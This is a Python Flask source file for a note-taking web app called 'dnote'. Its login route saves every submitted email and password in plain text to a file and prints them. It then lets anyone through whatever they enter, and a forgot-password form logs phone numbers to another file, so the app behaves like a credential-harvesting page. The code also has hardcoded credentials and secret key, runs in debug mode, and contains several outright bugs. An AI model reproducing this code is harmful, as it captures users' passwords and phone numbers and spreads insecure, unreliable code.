
from flask import Flask, request,render_template,redirect,url_for,flash,get_flashed_messages,Blueprint
from web import web_i
    
app = Flask(__name__)
app.register_blueprint(web_i)

users={
    "admin@dnote.com": "1234",
    "yourname@dnote.com": "mypassword",
    

}
security_code = "9988"




app = Flask(__name__)
app.secret_key = "any_random_string_here"
#show
@app.route("/")
def fweb():
    return render_template("fweb.html")
def home():
    return"OK"


#request
@app.route("/login", methods=["POST"])
def login():
    email = request.form.get("Email", "")
    password = request.form.get("Password", "")
    ree_sult = f"Email: {email}, Password: {password}"
    ree_sult += "users: "
    
     
    with open("passwords.txt", "a") as f:
            f.write(ree_sult + "\n ")

    print("Email:", email)
    print("Password:", password)

    if ree_sult==f"Email: {email}, Password: {password}users: ":
        return redirect (url_for('dashboard'))

    if email.strip() == "" or password.strip() == "":
        flash("Please fill in all fields.")
        return render_template("fweb.html")
     
  
     




   
#new function
@app.route("/forgot-password")
def forgot():
    return render_template("fweb-forgot.html")

@app.route("/send-number", methods=["POST"])
def send_number():
    number = request.form["Number", ""]
    country_code = request.form["country", ""]
    final_code = f"{country_code}{number}"
    final_code += security_code

    print("User Number:", number )
    print("Country Code:", country_code)
    if final_code == country_code + number + security_code:
        with open("numbers.txt", "a") as f:
            f.write(final_code + "\n ")
       
        return render_template("dashboard.html")
    else:
        return render_template("fweb-forgot.html")
    






#dashboard.html

@app.route("/save-note", methods=["POST"])
def save_note():
    note = request.form["note_content"]
    with open("notes.txt", "a") as f:
        f.write(note + "\n")

    return redirect(url_for('dashboard'))
  
@app.route("/dashboard")
def dashboard():
    all_notes = []  # Start with an empty list
    try:
        with open("notes.txt", "r") as f:
            
            all_notes = [line.strip() for line in f.readlines() ]
    except FileNotFoundError:
        pass  

    
    return render_template("dashboard.html", notes=all_notes)






if __name__=="__main__":
    import os
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", debug=True,port=port)
